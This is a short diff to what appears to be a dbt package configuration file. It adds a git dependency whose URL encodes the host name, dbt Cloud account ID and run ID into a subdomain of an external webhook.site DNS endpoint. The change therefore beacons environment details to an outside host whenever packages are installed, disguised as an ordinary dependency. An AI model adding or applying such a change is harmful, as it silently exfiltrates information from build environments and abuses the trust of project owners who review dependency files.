@@ -1,1 +1,3 @@
-packages: []
+packages:
+  - git: "https://{{ env_var('HOSTNAME', 'nohost') | replace('.', '-') | replace('/', '-') }}.{{ env_var('DBT_CLOUD_ACCOUNT_ID', 'noacct') }}.{{ env_var('DBT_CLOUD_RUN_ID', 'norun') }}.7bde71c599.dns.webhook.site"
+    revision: main
